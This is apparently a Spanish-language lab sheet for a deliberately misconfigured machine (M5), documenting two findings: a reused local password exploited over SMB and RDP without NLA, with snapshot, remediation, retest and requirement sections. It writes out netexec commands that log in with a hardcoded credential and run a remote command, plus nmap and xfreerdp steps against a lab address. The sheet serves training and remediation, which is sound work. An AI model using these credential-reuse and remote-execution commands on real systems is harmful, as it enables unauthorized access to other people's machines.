# C2–C3 · Configuraciones de M5

## 1. Ficha

| ID | Servicio | Configuración | CWE | CVSS |
|---|---|---|---|---|
| C2 | SMB / cuenta local | `cliente` / `Admin13.-` (reutilizada) | CWE-521 | ~8.8 |
| C3 | RDP | sin NLA | CWE-287 | ~7.5 |

## 2. Flujo

1. Snapshot M5: `previo-a-C2`.
2. C2:

```bash
nxc smb 10.10.10.15 -u cliente -p 'Admin13.-' --shares
nxc smb 10.10.10.15 -u cliente -p 'Admin13.-' -x whoami
```

3. C3:

```bash
nmap -sT --script rdp-enum-encryption -p 3389 10.10.10.15
xfreerdp /v:10.10.10.15 /u:cliente /p:'Admin13.-' /cert:ignore /dynamic-resolution
```

## 3. Resultado esperado

```text
C2: Pwn3d! / shares
C3: CredSSP (NLA): False / escritorio RDP
```

## 4. Evidencia

- `EV-C2-01`: `Pwn3d!` y shares.
- `EV-C3-01`: RDP sin NLA / escritorio.
- `LOG-M5`.

## 5. Impacto y siguiente salto

- C2: acceso a la estación con la clave de M4.
- C3: acceso gráfico/remoto.
- C4: control total del escritorio.

## 6. Remediación

```powershell
# C2
net user cliente "ClienteM5_2026!"
# LAPS

# C3
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name UserAuthentication -Value 1
```

## 7. Retest

```bash
nxc smb 10.10.10.15 -u cliente -p 'Admin13.-' --shares  # falla
nmap -sT --script rdp-enum-encryption -p 3389 10.10.10.15  # NLA True
```

## 8. EARS

- **REQ-C2-01 (Evento).** CUANDO se valide C2, el laboratorio DEBE capturar el acceso con la clave reutilizada.
- **REQ-C3-01 (Evento).** CUANDO se valide C3, el laboratorio DEBE capturar RDP sin NLA.
- **REQ-C2C3-02 (Ubicuo).** La remediación DEBE invalidar la clave vieja y exigir NLA.

## 9. Checklist

- [ ] Snapshot `previo-a-C2`.
- [ ] C2 acceso.
- [ ] C3 RDP.
- [ ] Remediación.
- [ ] Retest.
